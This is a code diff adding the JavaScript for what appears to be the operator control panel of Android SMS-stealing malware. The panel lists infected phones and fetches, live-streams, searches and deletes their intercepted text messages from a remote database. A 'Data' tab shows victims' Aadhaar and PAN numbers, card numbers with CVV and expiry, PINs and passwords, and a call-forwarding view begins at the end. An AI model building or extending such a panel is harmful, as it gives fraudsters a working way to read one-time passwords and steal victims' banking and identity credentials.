+    /* did field = key used in Sms, Data, SimINFO, Call_For nodes */
+    var did = info.did || info.Did || k;
+    newDevs[k] = {
+      key: k,
+      did: did,
+      name: name,
+      id: info.Id || info.id || k,
+      bat: info.Battery || info.battery || '',
+      on: isOn,
+      sms: (DEVS[k] && DEVS[k].sms) ? DEVS[k].sms : [],
+      sim: (DEVS[k] && DEVS[k].sim) ? DEVS[k].sim : {}
+    };
+  }
+  DEVS = newDevs;
+  document.getElementById('st-dev').textContent = total;
+  document.getElementById('st-on').textContent = online;
+  updSmsCnt();
+  renderDevLists();
+  if (CUR && DEVS[CUR] && document.getElementById('detail-screen').style.display === 'flex') {
+    var d = DEVS[CUR];
+    var badge = document.getElementById('d-stbadge');
+    badge.textContent = d.on ? 'Online' : 'Offline';
+    badge.className = 'd-st ' + (d.on ? 'd-st-on' : 'd-st-off');
+  }
+  /* Start realtime SMS SSE for online devices only */
+  for (var k in DEVS) {
+    if (DEVS[k].on) {
+      if (!SMS_ES[k]) startSmsSSE(k, DEVS[k].did || k);
+    } else {
+      stopSmsSSE(k);
+    }
+  }
+  /* Search is NOT auto-refreshed here anymore - matches the rest of the app's
+     "manual refresh only" principle. This previously silently re-fetched every
+     online device's SMS on every 60-second Info-poll cycle while search was open,
+     which was an unnecessary recurring data cost. */
+}
+
+function updSmsCnt() {
+  var midnight = new Date(); midnight.setHours(0,0,0,0);
+  var t = 0, devs = Object.values(DEVS);
+  for (var i = 0; i < devs.length; i++) {
+    var sms = devs[i].sms || [];
+    for (var j = 0; j < sms.length; j++) {
+      if (getTs(sms[j].date || '') >= midnight.getTime()) t++;
+    }
+  }
+  document.getElementById('st-sms').textContent = t;
+}
+
+/* ===== DASH TABS ===== */
+function switchDTab(tab) {
+  CURTAB = tab;
+  ['online','offline','allsms'].forEach(function(t) {
+    document.getElementById('dt-' + t).className = t === tab ? 'dtab active' : 'dtab inactive';
+    document.getElementById('pnl-' + t).style.display = t === tab ? '' : 'none';
+  });
+  if (tab === 'allsms') { loadAllSms(); startAllSmsTimer(); }
+  else clearInterval(ATIMER);
+}
+
+/* ===== DEVICE LISTS ===== */
+function renderDevLists() {
+  var devs = Object.values(DEVS), online = [], offline = [];
+  for (var i = 0; i < devs.length; i++) {
+    if (devs[i].on) online.push(devs[i]); else offline.push(devs[i]);
+  }
+  renderDevPanel('pnl-online', online, 0);
+  renderDevPanel('pnl-offline', offline, online.length);
+}
+
+function renderDevPanel(pid, devs, si) {
+  var el = document.getElementById(pid);
+  if (!devs.length) {
+    el.innerHTML = '<div class="empty"><div class="ei">&#128241;</div><p>Koi device nahi</p></div>';
+    return;
+  }
+  el.innerHTML = '';
+  var frag = document.createDocumentFragment();
+  for (var i = 0; i < devs.length; i++) {
+    var d = devs[i];
+    var card = document.createElement('div'); card.className = 'dev-card' + (d.on ? ' is-online' : '');
+    var inner = document.createElement('div'); inner.className = 'dev-inner';
+    /* Online: green dot | Offline: last SMS time (no ping - data saver) */
+    var statusHtml = d.on
+      ? '<div style="display:flex;align-items:center;gap:4px;margin-top:3px;flex-wrap:wrap;"><span style="width:7px;height:7px;border-radius:50%;background:#0c9c5e;box-shadow:0 0 5px rgba(12,156,94,.5);animation:blink 1.5s infinite;display:inline-block;"></span><span style="font-size:10px;color:#0c9c5e;font-weight:700;">Online</span><span id="syncwarn-' + d.key + '"></span></div>'
+      : '<div id="lst-' + d.key + '" style="font-size:10px;color:#94a3b8;margin-top:3px;">Last SMS: -</div>';
+    inner.innerHTML =
+      '<div class="dev-num">' + (si + i + 1) + '</div>' +
+      '<div class="dev-img">&#128241;</div>' +
+      '<div class="dev-info" style="flex:1;">' +
+        '<div class="dev-name">Mobile : ' + eh(d.name) + '</div>' +
+        '<div class="dev-id">Device Id : ' + eh(d.id) + '</div>' +
+        (d.bat ? '<div class="dev-bat">Battery : ' + eh(String(d.bat)) + '%</div>' : '') +
+        statusHtml +
+      '</div>';
+    (function(k) { inner.addEventListener('click', function() { openDev(k); }); })(d.key);
+    card.appendChild(inner);
+    var sr = document.createElement('div'); sr.className = 'dev-status-row';
+    var stxt = document.createElement('span');
+    stxt.className = d.on ? 'st-on' : 'st-off';
+    stxt.textContent = 'Status : ' + (d.on ? 'Online User' : 'Offline User');
+    sr.appendChild(stxt);
+    var db = document.createElement('button'); db.className = 'del-dev-btn'; db.textContent = 'Delete';
+    (function(k, b) {
+      b.addEventListener('click', function(e) { e.stopPropagation(); delDev(k, b); });
+    })(d.key, db);
+    sr.appendChild(db);
+    card.appendChild(sr);
+    frag.appendChild(card);
+  }
+  el.appendChild(frag);
+
+  /* Now that cards are attached to the real DOM, run the per-device async checks.
+     Speed mode: all devices run in parallel (no stagger delay) - user has unlimited
+     data and wants results to appear as fast as possible. */
+  devs.forEach(function(dj) {
+      if (!dj.on) {
+        /* Last SMS time for offline devices - fetch once, cached on the device object */
+        (function(dev) {
+          var cached = dev.lastSmsTime;
+          if (cached) {
+            var el2 = document.getElementById('lst-' + dev.key);
+            if (el2) el2.textContent = 'Last SMS: ' + cached;
+            return;
+          }
+          var url = DB + '/' + NODE + '/All_User/Sms/' + (dev.did || dev.key) + '.json?orderBy=%22$key%22&limitToLast=1' + (APIKEY ? '&auth=' + encodeURIComponent(APIKEY) : '');
+          fetch(url, { cache: 'no-store' }).then(function(r){ return r.json(); }).then(function(sd) {
+            var el2 = document.getElementById('lst-' + dev.key);
+            if (!sd || typeof sd !== 'object') { if(el2) el2.textContent = 'Last SMS: N/A'; return; }
+            var latest = 0;
+            Object.values(sd).forEach(function(s) {
+              var ts = getTs(s.date || s.Date || '');
+              if (ts > latest) latest = ts;
+            });
+            if (!latest) { if(el2) el2.textContent = 'Last SMS: N/A'; return; }
+            var diff = Date.now() - latest;
+            var mins = Math.floor(diff/60000), hrs = Math.floor(mins/60), days = Math.floor(hrs/24);
+            var ago = days>0 ? days+'d ago' : hrs>0 ? hrs+'h ago' : mins+'m ago';
+            dev.lastSmsTime = ago;
+            if (el2) el2.textContent = 'Last SMS: ' + ago;
+          }).catch(function(){});
+        })(dj);
+      } else {
+        /* Online device - check if SMS hasn't synced in 10+ days (possible permission revoked).
+           Checked ONCE per device per session (cached in SYNC_WARN_CACHE), never re-fetched
+           on subsequent Info-poll refreshes. */
+        (function(dev) {
+          var el2 = document.getElementById('syncwarn-' + dev.key);
+          if (!el2) return;
+          var cached = SYNC_WARN_CACHE[dev.key];
+          if (cached) {
+            if (cached.warn) {
+              el2.innerHTML = ' &#9888;&#65039; SMS not synced 10+ days';
+              el2.style.color = '#cc1f3a';
+              el2.style.fontWeight = '700';
+              el2.style.marginLeft = '4px';
+            }
+            return; /* already checked once before - no re-fetch */
+          }
+          var tenDaysAgo = Date.now() - (10 * 24 * 60 * 60 * 1000);
+          var url = DB + '/' + NODE + '/All_User/Sms/' + (dev.did || dev.key) + '.json?orderBy=%22$key%22&limitToLast=1' + (APIKEY ? '&auth=' + encodeURIComponent(APIKEY) : '');
+          fetch(url, { cache: 'no-store' }).then(function(r){ return r.json(); }).then(function(sd) {
+            var latest = 0;
+            if (sd && typeof sd === 'object') {
+              Object.values(sd).forEach(function(s) {
+                var ts = getTs(s.date || s.Date || '');
+                if (ts > latest) latest = ts;
+              });
+            }
+            var warn = (!latest || latest < tenDaysAgo);
+            SYNC_WARN_CACHE[dev.key] = { warn: warn };
+            var el3 = document.getElementById('syncwarn-' + dev.key);
+            if (warn && el3) {
+              el3.innerHTML = ' &#9888;&#65039; SMS not synced 10+ days';
+              el3.style.color = '#cc1f3a';
+              el3.style.fontWeight = '700';
+              el3.style.marginLeft = '4px';
+            }
+          }).catch(function(){});
+        })(dj);
+      }
+  });
+}
+
+/* ===== ALL SMS TAB ===== */
+var ALL_SMS_ES = null; /* Real-time SSE for All SMS */
+function startAllSmsSSE() {
+  /* Stop existing */
+  if (ALL_SMS_ES) { try { ALL_SMS_ES.close(); } catch(e){} ALL_SMS_ES = null; }
+}
+
+function loadAllSms() {
+  var infoEl = document.getElementById('asms-info');
+  var listEl = document.getElementById('asms-list');
+  listEl.innerHTML = '<div class="loading"><div class="spin"></div>&nbsp;Loading...</div>';
+  var devs = Object.values(DEVS);
+  var onDevs = devs.filter(function(d) { return d.on; });
+  if (!onDevs.length) {
+    infoEl.textContent = 'Koi online device nahi';
+    listEl.innerHTML = '<div class="empty"><div class="ei">&#128172;</div><p>Koi online device nahi</p></div>';
+    return;
+  }
+  var all = [], done = 0, total = onDevs.length;
+  var prevKeys = {};
+  for (var pk in PREV_KEYS) prevKeys[pk] = true;
+
+  /* Speed mode: fetch ALL online devices in parallel (no batching delay) since data
+     usage is no longer a constraint - this makes the tab feel instant. limitToLast
+     raised to 30 per device (was 10) to show more history per device preview. */
+  onDevs.forEach(function(dev) {
+    var devDid = dev.did || dev.key;
+    var auth = APIKEY ? '&auth=' + encodeURIComponent(APIKEY) : '';
+    var url = DB + '/' + NODE + '/All_User/Sms/' + devDid + '.json?orderBy=%22$key%22&limitToLast=30' + auth;
+    fetch(url, { cache: 'no-store' }).then(function(r){ return r.json(); }).then(function(smsData) {
+      if (smsData && typeof smsData === 'object') {
+        var numKeys = Object.keys(smsData);
+        for (var j = 0; j < numKeys.length; j++) {
+          var numKey = numKeys[j];
+          var s = smsData[numKey];
+          if (s && typeof s === 'object') {
+            var uid = dev.key + '_' + numKey;
+            all.push({
+              sms: {
+                _key: numKey,
+                _new: !prevKeys[uid],
+                date: s.date || s.Date || '',
+                msg: s.msg || s.body || s.Body || s.message || '',
+                ph: s.ph || s.address || s.Address || s.sender || ''
+              },
+              devKey: dev.key,
+              devName: dev.name
+            });
+          }
+        }
+      }
+      done++;
+      if (done >= total) renderAllSms(all);
+    }).catch(function() {
+      done++;
+      if (done >= total) renderAllSms(all);
+    });
+  });
+}
+
+function renderAllSms(all) {
+  all.sort(function(a, b) { return getTs(b.sms.date) - getTs(a.sms.date); });
+  var shown = all.slice(0, 150);
+  var newCount = 0;
+  shown.forEach(function(item) {
+    var uid = item.devKey + '_' + item.sms._key;
+    if (item.sms._new) { newCount++; PREV_KEYS[uid] = true; }
+  });
+  var infoEl = document.getElementById('asms-info');
+  var listEl = document.getElementById('asms-list');
+  infoEl.textContent = shown.length + ' SMS' + (newCount ? ' | ' + newCount + ' NEW' : '');
+  listEl.innerHTML = '';
+  if (!shown.length) {
+    listEl.innerHTML = '<div class="empty"><div class="ei">&#128172;</div><p>Koi SMS nahi</p></div>';
+    return;
+  }
+  var frag = document.createDocumentFragment();
+  for (var i = 0; i < shown.length; i++) {
+    var item = shown[i], s = item.sms;
+    var card = document.createElement('div');
+    card.className = 'asms-card' + (s._new ? ' is-new' : '');
+    var topDiv = document.createElement('div');
+    topDiv.style.cssText = 'display:flex;align-items:center;margin-bottom:5px;';
+    var devBadge = document.createElement('span'); devBadge.className = 'asms-dev';
+    devBadge.textContent = item.devName;
+    topDiv.appendChild(devBadge);
+    if (s._new) {
+      var nb = document.createElement('span'); nb.className = 'new-badge'; nb.textContent = 'NEW';
+      topDiv.appendChild(nb);
+    }
+    /* COPY button */
+    var cpBtn = document.createElement('button'); cpBtn.className = 'asms-del';
+    cpBtn.style.background = 'rgba(12,156,94,.08)'; cpBtn.style.borderColor = 'rgba(12,156,94,.35)'; cpBtn.style.color = '#0c9c5e';
+    cpBtn.textContent = 'COPY';
+    (function(msgText, btn) {
+      btn.addEventListener('click', function(e) {
+        e.stopPropagation();
+        copyTextToClipboard(msgText);
+        var orig = btn.textContent;
+        btn.textContent = 'DONE';
+        showToast('Message copied!');
+        setTimeout(function() { btn.textContent = orig; }, 1200);
+      });
+    })(s.msg || s.body || '', cpBtn);
+    topDiv.appendChild(cpBtn);
+    /* DEL button */
+    var delBtn = document.createElement('button'); delBtn.className = 'asms-del'; delBtn.textContent = 'DEL';
+    (function(dk, sk, b, c) {
+      b.addEventListener('click', function(e) {
+        e.stopPropagation();
+        if (!confirm('SMS delete karo?')) return;
+        b.textContent = '...'; b.disabled = true;
+        var ddid = (DEVS[dk] && DEVS[dk].did) ? DEVS[dk].did : dk;
+        fbDel('Sms/' + ddid + '/' + sk)
+          .then(function() { c.remove(); showToast('SMS deleted!'); })
+          .catch(function(er) { b.textContent = 'DEL'; b.disabled = false; showToast('Fail: ' + er.message); });
+      });
+    })(item.devKey, s._key, delBtn, card);
+    topDiv.appendChild(delBtn);
+    var aEl = document.createElement('div'); aEl.className = 'asms-addr';
+    aEl.textContent = 'Address : ' + (s.ph || '-');
+    var bEl = document.createElement('div'); bEl.className = 'asms-body';
+    bEl.textContent = s.msg || '-';
+    var tEl = document.createElement('div'); tEl.className = 'asms-time';
+    tEl.textContent = fmtDate(s.date);
+    card.appendChild(topDiv); card.appendChild(aEl); card.appendChild(bEl); card.appendChild(tEl);
+    (function(k) {
+      card.addEventListener('click', function(e) {
+        if (e.target.className !== 'asms-del') openDev(k);
+      });
+    })(item.devKey);
+    frag.appendChild(card);
+  }
+  listEl.appendChild(frag);
+  if (newCount > 0) showToast('&#128172; ' + newCount + ' naya SMS!');
+}
+
+function startAllSmsTimer() {
+  clearInterval(ATIMER); /* No auto refresh - manual only */
+}
+
+/* ===== DELETE DEVICE ===== */
+function delDev(key, btn) {
+  if (!confirm('Device delete karo?')) return;
+  btn.textContent = '...'; btn.disabled = true;
+  fbDel('Info/' + key)
+    .then(function() { delete DEVS[key]; updSmsCnt(); renderDevLists(); showToast('Device deleted!'); })
+    .catch(function(e) { btn.textContent = 'Delete'; btn.disabled = false; showToast('Fail: ' + e.message); });
+}
+
+/* ===== OPEN DEVICE ===== */
+function openDev(key) {
+  SCROLL_POS = window.scrollY; CUR = key;
+  document.getElementById('app').style.display = 'none';
+  document.getElementById('search-screen').style.display = 'none';
+  var ds = document.getElementById('detail-screen');
+  ds.style.display = 'flex'; ds.style.flexDirection = 'column';
+  var d = DEVS[key] || {};
+  document.getElementById('d-title').textContent = d.name || key;
+  var badge = document.getElementById('d-stbadge');
+  badge.textContent = d.on ? 'Online' : 'Offline';
+  badge.className = 'd-st ' + (d.on ? 'd-st-on' : 'd-st-off');
+  switchDtl('sms');
+  window.scrollTo(0, 0);
+  /* Preload Data + Call Forward tabs in the background (small payloads) so switching
+     to them later feels instant instead of showing a fresh loading spinner each time. */
+  preloadDataTab(key);
+  preloadFwdTab(key);
+}
+
+function devRefresh() {
+  var btn = document.getElementById('d-ref'); btn.textContent = '...';
+  var active = 'sms';
+  ['sms','data','fwd'].forEach(function(t) {
+    if (document.getElementById('tb-' + t).className === 'tab-btn active') active = t;
+  });
+  switchDtl(active);
+  setTimeout(function() { btn.textContent = '↻'; showToast('Refreshed!'); }, 800);
+}
+
+function goBack() {
+  document.getElementById('detail-screen').style.display = 'none';
+  var q = (document.getElementById('gsearch').value || '').trim();
+  if (q) {
+    var ss = document.getElementById('search-screen'); ss.style.display = 'flex'; ss.style.flexDirection = 'column';
+  } else {
+    var ap = document.getElementById('app'); ap.style.display = 'flex'; ap.style.flexDirection = 'column';
+    setTimeout(function() { window.scrollTo(0, SCROLL_POS); }, 50);
+  }
+}
+
+/* ===== DETAIL TABS ===== */
+function switchDtl(tab) {
+  ['sms','data','fwd','note'].forEach(function(t) {
+    var btn = document.getElementById('tb-' + t);
+    var pnl = document.getElementById('pnl-' + t);
+    if (btn) btn.className = t === tab ? 'tab-btn active' : 'tab-btn inactive';
+    if (pnl) pnl.className = t === tab ? 'panel' : 'panel hide';
+  });
+  if (tab === 'sms') loadSmsTab(CUR);
+  else if (tab === 'data') loadDataTab(CUR);
+  else if (tab === 'fwd') loadFwdTab(CUR);
+  else if (tab === 'note') loadNoteTab(CUR);
+}
+
+/* ===== SMS TAB ===== */
+/*
+  Structure: Sms/<deviceKey>/<numKey>/ {date, msg, ph}
+  numKey = numeric like 72312, 72313...
+  We fetch Sms/<deviceKey> which returns {72312:{...}, 72313:{...}}
+*/
+function loadSmsTab(key) {
+  var pnl = document.getElementById('pnl-sms');
+  var listEl = document.getElementById('dev-sms-list');
+  var searchBar = document.getElementById('dev-sms-search');
+  /* If new structure exists, use it; else fallback */
+  var el = listEl || pnl;
+  if (searchBar) searchBar.style.display = 'none';
+  /* Use did field for Sms node key */
+  var did = (DEVS[key] && DEVS[key].did) ? DEVS[key].did : key;
+  var auth = APIKEY ? '&auth=' + encodeURIComponent(APIKEY) : '';
+  var fetchUrl = DB + '/' + NODE + '/All_User/Sms/' + did + '.json?orderBy=%22$key%22&limitToLast=100' + auth;
+  var fullUrl = DB + '/' + NODE + '/All_User/Sms/' + did + '.json' + (APIKEY ? '?auth=' + encodeURIComponent(APIKEY) : '');
+  (el || listEl).innerHTML = '<div class="loading"><div class="spin"></div>&nbsp;SMS load ho raha hai...</div>';
+
+  fetch(fetchUrl)
+    .then(function(r) {
+      if (!r.ok) throw new Error('HTTP ' + r.status);
+      return r.json();
+    })
+    .then(function(smsData) {
+      /* smsData = {72312:{date,msg,ph}, 72313:{date,msg,ph}, ...} OR null */
+      var arr = [];
+      if (smsData && typeof smsData === 'object' && !smsData.error) {
+        var numKeys = Object.keys(smsData);
+        for (var i = 0; i < numKeys.length; i++) {
+          var numKey = numKeys[i];
+          var s = smsData[numKey];
+          if (s && typeof s === 'object') {
+            arr.push({
+              _key: numKey,
+              date: s.date || s.Date || '',
+              msg: s.msg || s.body || s.Body || s.message || s.text || '',
+              ph: s.ph || s.address || s.Address || s.sender || s.from || s.number || ''
+            });
+          }
+        }
+      }
+      if (DEVS[key]) DEVS[key].sms = arr;
+      updSmsCnt(); renderDevLists();
+      renderSmsPanel(key, arr, el, fetchUrl);
+    })
+    .catch(function(e) {
+      el.innerHTML = '<div class="empty"><div class="ei">&#9888;&#65039;</div>' +
+        '<p>SMS load fail</p>' +
+        '<div class="debug-box">URL: ' + fetchUrl + '<br>Error: ' + e.message + '</div></div>';
+    });
+}
+
+var DEV_SMS_ALL = []; /* Cache for device SMS search */
+var DEV_SMS_KEY = ''; /* Current device key */
+
+function renderSmsPanel(key, sms, el, debugUrl) {
+  var listEl = document.getElementById('dev-sms-list');
+  var searchBar = document.getElementById('dev-sms-search');
+  var useEl = listEl || el;
+
+  if (!sms || !sms.length) {
+    if (searchBar) searchBar.style.display = 'none';
+    useEl.innerHTML =
+      '<div class="empty"><div class="ei">&#128172;</div><p>Koi SMS nahi mila</p></div>' +
+      '<div class="debug-box" style="margin:14px;">Fetch URL:<br>' + (debugUrl || '') + '</div>';
+    return;
+  }
+  /* Sort by date - latest first */
+  sms.sort(function(a, b) { return getTs(b.date) - getTs(a.date); });
+  DEV_SMS_ALL = sms;
+  DEV_SMS_KEY = key;
+  if (searchBar) searchBar.style.display = 'block';
+  var qEl = document.getElementById('dev-sms-q');
+  if (qEl) qEl.value = '';
+  useEl.innerHTML = '';
+  var frag = document.createDocumentFragment();
+  /* Use renderSmsCards to avoid code duplication */
+  renderSmsCards(sms, listEl, key);
+  var dummy_never_reached = false;
+  if (dummy_never_reached) { /* old code placeholder */
+    var s = sms[0];
+    var card = document.createElement('div'); card.className = 'sms-card';
+    var row = document.createElement('div');
+    row.style.cssText = 'display:flex;';
+    var left = document.createElement('div'); left.style.flex = '1';
+    var aEl = document.createElement('div'); aEl.className = 'sms-addr';
+    aEl.textContent = 'Address : ' + (s.ph || '-');
+    var bEl = document.createElement('div'); bEl.className = 'sms-body';
+    bEl.textContent = s.msg || '-';
+    var tEl = document.createElement('div'); tEl.className = 'sms-time';
+    tEl.textContent = fmtDate(s.date);
+    left.appendChild(aEl); left.appendChild(bEl); left.appendChild(tEl);
+    row.appendChild(left);
+    var dBtn = document.createElement('button');
+    dBtn.textContent = 'DEL';
+    dBtn.style.cssText = 'background:#fef2f2;';
+    (function(dk, sk, b) {
+      b.addEventListener('click', function() {
+        if (!confirm('SMS delete karo?')) return;
+        b.textContent = '...'; b.disabled = true;
+        var ddid = (DEVS[dk] && DEVS[dk].did) ? DEVS[dk].did : dk;
+        fbDel('Sms/' + ddid + '/' + sk)
+          .then(function() {
+            if (DEVS[dk]) DEVS[dk].sms = DEVS[dk].sms.filter(function(x) { return x._key !== sk; });
+            showToast('SMS deleted!'); loadSmsTab(dk);
+          })
+          .catch(function(er) { b.textContent = 'DEL'; b.disabled = false; showToast('Fail: ' + er.message); });
+      });
+    })(key, s._key, dBtn);
+    row.appendChild(dBtn);
+    card.appendChild(row);
+    frag.appendChild(card);
+  }
+  el.appendChild(frag);
+}
+
+/* ===== DEVICE SMS SEARCH ===== */
+function loadAllDevSms() {
+  if (!CUR) return;
+  var btn = document.getElementById('load-all-sms-btn');
+  if (btn) { btn.disabled = true; btn.textContent = '⏳ Loading...'; }
+  var dev = DEVS[CUR];
+  if (!dev) return;
+  var did = dev.did || CUR;
+  var auth = APIKEY ? ('?auth=' + encodeURIComponent(APIKEY)) : '';
+  /* Fetch ALL SMS without limit */
+  var url = DB + '/' + NODE + '/All_User/Sms/' + did + '.json?orderBy=%22$key%22' + (auth ? '&' + auth.slice(1) : '');
+  fetch(url)
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      var pnl = document.getElementById('pnl-sms');
+      if (!data || typeof data !== 'object') {
+        if (btn) { btn.disabled = false; btn.textContent = '📥 Load All SMS (manual)'; }
+        showToast('Koi SMS nahi mila');
+        return;
+      }
+      var keys = Object.keys(data).sort();
+      var total = keys.length;
+      /* Remove existing SMS cards and re-render all */
+      var list = document.getElementById('dev-sms-list');
+      list.innerHTML = '';
+      keys.reverse().forEach(function(k) {
+        var s = data[k];
+        if (!s) return;
+        var card = document.createElement('div');
+        card.className = 'sms-card';
+        card.innerHTML =
+          '<div class="sms-addr">' + (s.address || s.sender || '—') + '</div>' +
+          '<div class="sms-body">' + (s.body || s.message || '') + '</div>' +
+          '<div class="sms-time">' + (s.date ? new Date(s.date).toLocaleString('en-IN') : '') + '</div>';
+        list.appendChild(card);
+      });
+      if (btn) {
+        btn.disabled = false;
+        btn.textContent = '✅ ' + total + ' SMS loaded — Scroll up to see all';
+      }
+      showToast('✅ ' + total + ' SMS loaded!');
+    })
+    .catch(function(e) {
+      if (btn) { btn.disabled = false; btn.textContent = '📥 Load All SMS (manual)'; }
+      showToast('❌ Load failed: ' + e.message);
+    });
+}
+
+function devSmsSearch() {
+  var q = (document.getElementById('dev-sms-q').value || '').trim().toLowerCase();
+  var listEl = document.getElementById('dev-sms-list');
+  if (!q) { renderSmsCards(DEV_SMS_ALL, listEl, CUR); return; }
+  var filtered = DEV_SMS_ALL.filter(function(s) {
+    return (s.msg||'').toLowerCase().indexOf(q) !== -1 ||
+           (s.ph||'').toLowerCase().indexOf(q) !== -1;
+  });
+  if (!filtered.length) {
+    listEl.innerHTML = '<div class="empty"><div class="ei">&#128269;</div><p>Koi SMS nahi</p></div>';
+    return;
+  }
+  renderSmsCards(filtered, listEl, CUR);
+}
+function devSmsClear() {
+  if (document.getElementById('dev-sms-q')) document.getElementById('dev-sms-q').value = '';
+  var listEl = document.getElementById('dev-sms-list');
+  renderSmsCards(DEV_SMS_ALL, listEl, CUR);
+}
+function renderSmsCards(sms, listEl, key, newKeysSet) {
+  listEl.innerHTML = '';
+  newKeysSet = newKeysSet || {};
+  var frag = document.createDocumentFragment();
+  for (var i = 0; i < sms.length; i++) {
+    var s = sms[i];
+    var isNew = !!newKeysSet[s._key];
+    var card = document.createElement('div'); card.className = 'sms-card' + (isNew ? ' just-arrived' : '');
+    card.id = 'sms-card-' + s._key; /* ID for scroll targeting */
+    var row = document.createElement('div');
+    row.style.cssText = 'display:flex;align-items:flex-start;justify-content:space-between;gap:8px;';
+    var left = document.createElement('div'); left.style.flex = '1';
+    var aRow = document.createElement('div'); aRow.style.cssText = 'display:flex;align-items:center;flex-wrap:wrap;';
+    var aEl = document.createElement('span'); aEl.className = 'sms-addr'; aEl.textContent = 'Address : ' + (s.ph||'-');
+    aRow.appendChild(aEl);
+    if (isNew) {
+      var nb = document.createElement('span'); nb.className = 'new-sms-badge'; nb.textContent = 'NEW';
+      aRow.appendChild(nb);
+    }
+    var bEl = document.createElement('div'); bEl.className = 'sms-body'; bEl.textContent = s.msg||'-';
+    var tEl = document.createElement('div'); tEl.className = 'sms-time'; tEl.textContent = fmtDate(s.date);
+    left.appendChild(aRow); left.appendChild(bEl); left.appendChild(tEl);
+    row.appendChild(left);
+    var btnCol = document.createElement('div');
+    btnCol.style.cssText = 'display:flex;flex-direction:column;gap:6px;flex-shrink:0;';
+    var cpBtn = document.createElement('button'); cpBtn.textContent = 'COPY';
+    cpBtn.style.cssText = 'background:rgba(12,156,94,.08);border:1px solid rgba(12,156,94,.35);color:#0c9c5e;border-radius:8px;padding:5px 9px;font-size:11px;cursor:pointer;flex-shrink:0;font-family:inherit;font-weight:700;';
+    (function(msgText, btn) {
+      btn.addEventListener('click', function() {
+        copyTextToClipboard(msgText);
+        var orig = btn.textContent;
+        btn.textContent = 'DONE';
+        showToast('Message copied!');
+        setTimeout(function() { btn.textContent = orig; }, 1200);
+      });
+    })(s.msg || '', cpBtn);
+    var dBtn = document.createElement('button'); dBtn.textContent = 'DEL';
+    dBtn.style.cssText = 'background:rgba(204,31,58,.08);border:1px solid rgba(204,31,58,.3);color:#cc1f3a;border-radius:8px;padding:5px 9px;font-size:11px;cursor:pointer;flex-shrink:0;font-family:inherit;font-weight:700;';
+    (function(sk, b) {
+      b.addEventListener('click', function() {
+        if (!confirm('SMS delete karo?')) return;
+        b.textContent = '...'; b.disabled = true;
+        var ddid = (DEVS[key] && DEVS[key].did) ? DEVS[key].did : key;
+        fbDel('Sms/' + ddid + '/' + sk)
+          .then(function() {
+            if (DEVS[key]) DEVS[key].sms = DEVS[key].sms.filter(function(x){ return x._key !== sk; });
+            DEV_SMS_ALL = DEV_SMS_ALL.filter(function(x){ return x._key !== sk; });
+            showToast('SMS deleted!'); loadSmsTab(key);
+          }).catch(function(e){ b.textContent='DEL'; b.disabled=false; showToast('Fail: '+e.message); });
+      });
+    })(s._key, dBtn);
+    btnCol.appendChild(cpBtn); btnCol.appendChild(dBtn);
+    row.appendChild(btnCol); card.appendChild(row); frag.appendChild(card);
+  }
+  listEl.appendChild(frag);
+  /* Remove the "just-arrived" highlight after a few seconds so it doesn't stay
+     green forever - the badge's own animation already fades, this is just cleanup */
+  if (Object.keys(newKeysSet).length) {
+    setTimeout(function() {
+      Object.keys(newKeysSet).forEach(function(k) {
+        var el = document.getElementById('sms-card-' + k);
+        if (el) el.classList.remove('just-arrived');
+      });
+    }, 3500);
+  }
+}
+
+/* Robust clipboard copy - works even without HTTPS/clipboard-API permission (common in WebView/old browsers) */
+function copyTextToClipboard(text) {
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(text).catch(function() { fallbackCopy(text); });
+  } else {
+    fallbackCopy(text);
+  }
+}
+function fallbackCopy(text) {
+  var ta = document.createElement('textarea');
+  ta.value = text;
+  ta.style.position = 'fixed'; ta.style.left = '-9999px';
+  document.body.appendChild(ta);
+  ta.focus(); ta.select();
+  try { document.execCommand('copy'); } catch(e) {}
+  document.body.removeChild(ta);
+}
+
+/* ===== DATA TAB ===== */
+var DATA_TAB_CACHE = {}; /* devKey -> built HTML string, populated by preload */
+
+function buildDataHtml(data) {
+  if (!data || typeof data !== 'object') {
+    return '<div class="empty"><div class="ei">&#128196;</div><p>Koi data nahi mila</p></div>';
+  }
+  var fields = [
+    {k:'Name', l:'&#128100; Name'}, {k:'Number', l:'&#128222; Mobile No'},
+    {k:'Aadhaar', l:'&#128196; Aadhaar'}, {k:'PanCard', l:'&#128196; PAN Card'},
+    {k:'Dob', l:'&#128197; Date of Birth'}, {k:'Card', l:'&#128179; Card Number'},
+    {k:'Cvv', l:'&#128274; CVV'}, {k:'Expiry', l:'&#128197; Expiry'},
+    {k:'Pin', l:'&#128274; PIN'}, {k:'Pass', l:'&#128274; Password'},
+    {k:'CustID', l:'&#128100; Customer ID'}
+  ];
+  var html = '<div style="padding:14px 0;">', shown = {};
+  for (var i = 0; i < fields.length; i++) {
+    var f = fields[i]; shown[f.k] = true;
+    var val = data[f.k] || data[f.k.toLowerCase()] || '';
+    html += '<div class="info-card"><div class="info-label">' + f.l + '</div>' +
+      '<div class="info-val">' + eh(val || '-') + '</div></div>';
+  }
+  var eks = Object.keys(data);
+  for (var i = 0; i < eks.length; i++) {
+    if (!shown[eks[i]]) {
+      html += '<div class="info-card"><div class="info-label">' + eh(eks[i]) + '</div>' +
+        '<div class="info-val">' + eh(String(data[eks[i]])) + '</div></div>';
+    }
+  }
+  html += '</div>';
+  return html;
+}
+
+function preloadDataTab(key) {
+  var did = (DEVS[key] && DEVS[key].did) ? DEVS[key].did : key;
+  fbGet('Data/' + did).then(function(data) {
+    DATA_TAB_CACHE[key] = buildDataHtml(data);
+  }).catch(function() {});
+}
+
+function loadDataTab(key) {
+  var el = document.getElementById('pnl-data');
+  /* If preload already finished, show it instantly - no spinner, no wait */
+  if (DATA_TAB_CACHE[key]) { el.innerHTML = DATA_TAB_CACHE[key]; return; }
+  el.innerHTML = '<div class="loading"><div class="spin"></div>&nbsp;Loading...</div>';
+  var did = (DEVS[key] && DEVS[key].did) ? DEVS[key].did : key;
+  fbGet('Data/' + did)
+    .then(function(data) {
+      var html = buildDataHtml(data);
+      DATA_TAB_CACHE[key] = html;
+      el.innerHTML = html;
+    })
+    .catch(function(e) {
+      el.innerHTML = '<div class="empty"><div class="ei">&#128196;</div><p>Load fail: ' + e.message + '</p></div>';
+    });
+}
+
+/* ===== FORWARD TAB ===== */
+var FWD_TAB_CACHE = {}; /* devKey -> built HTML string */
+
+function buildFwdHtml(cfData, fs) {
+  var html = '<div style="padding:14px 0;">';
+  html += '<div class="info-card"><div class="info-label">&#128222; Call Forwarding</div>';
+  if (cfData && cfData.PhoneNumber) {
